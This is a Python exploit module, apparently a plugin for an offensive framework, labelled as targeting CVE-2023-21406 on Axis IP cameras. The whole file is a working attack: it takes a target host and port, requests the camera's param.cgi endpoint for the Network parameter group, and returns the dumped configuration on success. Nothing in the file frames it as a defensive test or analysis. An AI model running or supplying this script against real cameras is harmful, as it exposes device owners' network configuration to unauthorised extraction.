import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "axis/cve_2023_21406_attack"
        self.description = "Exploit module to extract the full raw network parameter configuration from Axis IP cameras."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        url = f"http://{target}:{port}/axis-cgi/param.cgi?action=list&group=Network"
        
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                print("\033[1;33m[*] Extraction de la configuration réseau Axis...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and "Network." in response.text:
                    return {
                        "success": True,
                        "details": f"Axis network configuration file dumped successfully:\n{response.text.strip()}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit triggered but target denied access or is already patched."}
